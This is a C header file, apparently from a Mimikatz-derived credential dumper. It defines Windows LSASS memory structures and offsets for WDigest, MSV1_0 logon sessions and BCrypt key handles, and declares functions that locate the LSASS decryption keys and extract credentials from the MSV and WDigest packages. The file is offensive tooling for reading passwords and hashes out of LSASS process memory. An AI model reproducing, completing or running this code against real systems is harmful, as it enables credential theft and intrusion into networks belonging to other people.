#pragma once

#define SECURITY_WIN32
#include <Windows.h>
#include <sspi.h>
#include <ntsecapi.h>
#include <ntsecpkg.h>
#include <tlhelp32.h>

//** Offsets and Structs credited to Mimikatz **/
// 完全从 Mimikatz 中复制粘贴过来的重要结构体定义&偏移

typedef struct _KIWI_WDIGEST_LIST_ENTRY {
	struct _KIWI_WDIGEST_LIST_ENTRY* Flink;
	struct _KIWI_WDIGEST_LIST_ENTRY* Blink;
	ULONG	UsageCount;
	struct _KIWI_WDIGEST_LIST_ENTRY* This;
	LUID LocallyUniqueIdentifier;
    PVOID unknown; // for padding reason I added this 4 fields below
	UNICODE_STRING UserName; // 0x30
	UNICODE_STRING Domaine;  // 0x40
	UNICODE_STRING Password; // 0x50
} KIWI_WDIGEST_LIST_ENTRY, * PKIWI_WDIGEST_LIST_ENTRY;

typedef struct _KUHL_M_SEKURLSA_CONTEXT {
    PVOID hLsassMem;
    PVOID osContext;
} KUHL_M_SEKURLSA_CONTEXT, * PKUHL_M_SEKURLSA_CONTEXT;

typedef struct _KUHL_M_SEKURLSA_LOCAL_HELPER {
    PVOID initLocalLib;
    PVOID cleanLocalLib;
    PVOID AcquireKeys;
    const PLSA_PROTECT_MEMORY* pLsaProtectMemory;
    const PLSA_PROTECT_MEMORY* pLsaUnprotectMemory;
} KUHL_M_SEKURLSA_LOCAL_HELPER, * PKUHL_M_SEKURLSA_LOCAL_HELPER;

typedef struct _KIWI_BASIC_SECURITY_LOGON_SESSION_DATA {
    PKUHL_M_SEKURLSA_CONTEXT	cLsass;
    const KUHL_M_SEKURLSA_LOCAL_HELPER* lsassLocalHelper;
    PLUID						LogonId;
    PLSA_UNICODE_STRING			UserName;
    PLSA_UNICODE_STRING			LogonDomain;
    ULONG						LogonType;
    ULONG						Session;
    PVOID						pCredentials;
    PSID						pSid;
    PVOID						pCredentialManager;
    FILETIME					LogonTime;
    PLSA_UNICODE_STRING			LogonServer;
} KIWI_BASIC_SECURITY_LOGON_SESSION_DATA, * PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA;

typedef struct _KUHL_M_SEKURLSA_ENUM_HELPER {
    SIZE_T tailleStruct;
    ULONG offsetToLuid;
    ULONG offsetToLogonType;
    ULONG offsetToSession;
    ULONG offsetToUsername;
    ULONG offsetToDomain;
    ULONG offsetToCredentials;
    ULONG offsetToPSid;
    ULONG offsetToCredentialManager;
    ULONG offsetToLogonTime;
    ULONG offsetToLogonServer;
} KUHL_M_SEKURLSA_ENUM_HELPER, * PKUHL_M_SEKURLSA_ENUM_HELPER;

typedef struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS {
    struct _KIWI_MSV1_0_PRIMARY_CREDENTIALS* next;
    STRING Primary;
    LSA_UNICODE_STRING Credentials;
} KIWI_MSV1_0_PRIMARY_CREDENTIALS, * PKIWI_MSV1_0_PRIMARY_CREDENTIALS;

typedef struct _KIWI_MSV1_0_CREDENTIALS {
    struct _KIWI_MSV1_0_CREDENTIALS* next;
    DWORD AuthenticationPackageId;
    PKIWI_MSV1_0_PRIMARY_CREDENTIALS PrimaryCredentials;
} KIWI_MSV1_0_CREDENTIALS, * PKIWI_MSV1_0_CREDENTIALS;

typedef struct _KIWI_MSV1_0_LIST_63 {
    struct _KIWI_MSV1_0_LIST_63* Flink;	//off_2C5718
    struct _KIWI_MSV1_0_LIST_63* Blink; //off_277380
    PVOID unk0; // unk_2C0AC8
    ULONG unk1; // 0FFFFFFFFh
    PVOID unk2; // 0
    ULONG unk3; // 0
    ULONG unk4; // 0
    ULONG unk5; // 0A0007D0h
    HANDLE hSemaphore6; // 0F9Ch
    PVOID unk7; // 0
    HANDLE hSemaphore8; // 0FB8h
    PVOID unk9; // 0
    PVOID unk10; // 0
    ULONG unk11; // 0
    ULONG unk12; // 0 
    PVOID unk13; // unk_2C0A28
    LUID LocallyUniqueIdentifier;
    LUID SecondaryLocallyUniqueIdentifier;
    BYTE waza[12]; /// to do (maybe align)
    LSA_UNICODE_STRING UserName;
    LSA_UNICODE_STRING Domaine;
    PVOID unk14;
    PVOID unk15;
    LSA_UNICODE_STRING Type;
    PSID  pSid;
    ULONG LogonType;
    PVOID unk18;
    ULONG Session;
    LARGE_INTEGER LogonTime; // autoalign x86
    LSA_UNICODE_STRING LogonServer;
    PKIWI_MSV1_0_CREDENTIALS Credentials;
    PVOID unk19;
    PVOID unk20;
    PVOID unk21;
    ULONG unk22;
    ULONG unk23;
    ULONG unk24;
    ULONG unk25;
    ULONG unk26;
    PVOID unk27;
    PVOID unk28;
    PVOID unk29;
    PVOID CredentialManager;
} KIWI_MSV1_0_LIST_63, * PKIWI_MSV1_0_LIST_63;

typedef struct _KIWI_HARD_KEY {
    ULONG cbSecret;
    BYTE data[60]; // etc...
} KIWI_HARD_KEY, * PKIWI_HARD_KEY;

typedef struct _KIWI_BCRYPT_KEY81 {
    ULONG size;
    ULONG tag;	// 'MSSK'
    ULONG type;
    ULONG unk0;
    ULONG unk1;
    ULONG unk2;
    ULONG unk3;
    ULONG unk4;
    PVOID unk5;	// before, align in x64
    ULONG unk6;
    ULONG unk7;
    ULONG unk8;
    ULONG unk9;
    KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY81, * PKIWI_BCRYPT_KEY81;

typedef struct _KIWI_BCRYPT_HANDLE_KEY {
    ULONG size;
    ULONG tag;	// 'UUUR'
    PVOID hAlgorithm;
    PKIWI_BCRYPT_KEY81 key;
    PVOID unk0;
} KIWI_BCRYPT_HANDLE_KEY, * PKIWI_BCRYPT_HANDLE_KEY;

//* End structs and offsets *//

VOID PrepareUnprotectLsassMemoryKeys();
VOID LocateUnprotectLsassMemoryKeys();
VOID GetCredentialsFromMSV();
VOID GetCredentialsFromWdigest();